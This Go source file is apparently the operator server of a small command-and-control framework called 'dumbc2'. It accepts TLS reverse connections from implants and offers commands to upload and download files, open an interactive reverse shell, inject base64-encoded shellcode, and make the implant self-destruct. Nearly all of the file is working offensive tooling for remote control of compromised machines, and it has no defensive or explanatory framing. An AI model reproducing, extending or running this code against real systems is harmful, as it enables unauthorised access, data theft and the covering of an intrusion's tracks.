package useri

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/remoteop"
	"github.com/kmahyyg/dumbc2/transport"
	"github.com/kmahyyg/dumbc2/utils"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

const (
	downloadCmd        = "DWLD"
	uploadCmd          = "UPLD"
	selfDestroyCmd     = "BOOM"
	getShellCmd        = "BASH"
	injectShellCodeCmd = "INJE"
)

func StartServer(userOP config.UserOperation) {
	// server mode
	fladdr := userOP.ListenAddr
	lbserver, err := transport.TLSServerBuilder(fladdr, true)
	if err != nil {
		panic(err)
	}
	for true {
		if lbserver != nil {
			conn, err := lbserver.Accept()
			if err != nil {
				log.Println(err)
				continue
			}
			_ = conn.SetDeadline(time.Now().Add(time.Minute * 10))
			handleClient(conn)
		} else {
			log.Fatalln("Failed to bind.")
		}
	}
}

func printHelp() {
	fmt.Println(
		`
Usage: 
bash = Get Shell (Interactive)
upload <Source File Path> <Destination File Path> = Upload file
download <Source File Path> <Destination File Path> = Download file
boom = Self-Destroy
exit = Close Program
help = Show This Message
inject <BASE64-Encoded Code> = Execute Shell Code
`)
}

func handleClient(conn net.Conn) {
	// start as tls server, means it's a reverse shell
	printHelp()
	fmt.Println("Connection established.")
	fmt.Println("Commands: upload, download, boom, bash, exit, help, shellcode.\n")
	for true {
		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
		useript := utils.ReadUserInput()
		useriptD := strings.Split(useript, " ")
		var curRTCmd *remoteop.RTCommand
		var curPingBack *remoteop.PingBack
		switch useriptD[0] {
		case "upload":
			fd, err := os.Stat(useriptD[1])
			if err != nil {
				log.Println(err)
				continue
			}
			fdlen := func() int64 {
				size := fd.Size()
				return (size / 1048576) + 1
			}
			if fdlen() > 255 {
				log.Println("Exceeds max length, 253M")
				continue
			} else {
				buf := make([]byte, 1)
				binary.PutVarint(buf, fdlen())
				curRTCmd = &remoteop.RTCommand{
					Command:        []byte(uploadCmd),
					FilePathLocal:  []byte(useriptD[1]),
					FilePathRemote: []byte(useriptD[2]),
					FileLength:     buf[0],
					HasData:        byte(1),
				}
				err := curRTCmd.BuildnSend(conn)
				if err != nil {
					log.Println(err)
					continue
				}
				curPingBack, err = remoteop.ParseIncomingPB(conn)
				if err != nil {
					log.Println(err)
					continue
				}
				if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
					log.Println("Failed to execute command.")
					continue
				}
			}
		case "download":
			curRTCmd := &remoteop.RTCommand{
				Command:        []byte(downloadCmd),
				FilePathLocal:  []byte(useriptD[2]),
				FilePathRemote: []byte(useriptD[1]),
				FileLength:     0,
				HasData:        0,
				RealData:       nil,
			}
			err := curRTCmd.BuildnSend(conn)
			if err != nil {
				log.Println(err)
				continue
			}
			curPingBack, err := remoteop.ParseIncomingPB(conn)
			if err != nil {
				log.Println(err)
				continue
			}
			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
				log.Println(errors.New("Function execution error."))
				continue
			}
			// write out to file
			err = ioutil.WriteFile(string(curRTCmd.FilePathLocal), curPingBack.DataPart, 0644)
			if err != nil {
				log.Println(err)
				continue
			}
		case "boom":
			curRTCmd := &remoteop.RTCommand{
				Command: []byte(selfDestroyCmd),
				HasData: 0,
			}
			err := curRTCmd.BuildnSend(conn)
			if err != nil {
				log.Println(err)
				continue
			}
			curPingBack, err := remoteop.ParseIncomingPB(conn)
			if err != nil {
				log.Println(err)
				break
			}
			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
				log.Println(errors.New("Function execution error."))
				break
			}
			break
		case "bash":
			fmt.Println("** PLease Note This Shell doesn't Support TTY or Upgrade to TTY. **\n")
			curRTCmd = &remoteop.RTCommand{
				Command: []byte(getShellCmd),
				HasData: byte(0),
			}
			err := curRTCmd.BuildnSend(conn)
			if err != nil {
				log.Println(err)
				continue
			}
			_ = conn.SetReadDeadline(time.Now().Add(time.Minute * 1))
			// no need to check pingback
			copydata := func(r io.Reader, w io.Writer) {
				_, err := io.Copy(w, r)
				if err != nil {
					log.Println(err)
				}
			}
			go copydata(os.Stdout, conn)
			scanner := bufio.NewScanner(os.Stdin)
			for scanner.Scan() {
				inputcmd := scanner.Bytes()
				_, err := conn.Write(inputcmd)
				if err != nil {
					log.Println(err)
					break
				}
				if bytes.Equal(inputcmd, []byte("exit\n")) || bytes.Equal(inputcmd, []byte("exit\r\n")) {
					break
				}
			}
		case "inject":
			curRTCmd := &remoteop.RTCommand{
				Command:    []byte(injectShellCodeCmd),
				FileLength: 1, // Max 1M Allowed
				HasData:    1,
				RealData:   []byte(useriptD[1]),
			}
			_ = conn.SetReadDeadline(time.Now().Add(2 * time.Minute))
			err := curRTCmd.BuildnSend(conn)
			if err != nil {
				log.Println(err)
				continue
			}
			curPingBack, err := remoteop.ParseIncomingPB(conn)
			_ = conn.SetReadDeadline(time.Now().Add(10 * time.Minute))
			if err != nil {
				log.Println(err)
				continue
			}
			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
				log.Println("Function Execution Error. Agent may exits.")
				continue
			}
		case "exit":
			break
		case "help":
			fallthrough
		default:
			printHelp()
		}
	}
	defer func() { _ = conn.Close() }()
}
